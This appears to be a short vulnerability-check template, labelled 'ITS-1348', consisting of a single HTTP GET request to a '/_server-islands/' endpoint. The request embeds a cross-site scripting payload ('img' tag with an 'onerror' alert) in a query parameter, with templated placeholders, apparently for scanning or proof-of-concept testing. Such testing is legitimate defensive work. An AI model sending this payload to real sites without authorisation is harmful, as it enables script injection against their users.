# Vulnerable: ITS-1348
GET /_server-islands/{{value}}?e=file&p=&s={"{{rand}}":"<img+src=x+onerror=alert(0)>"}
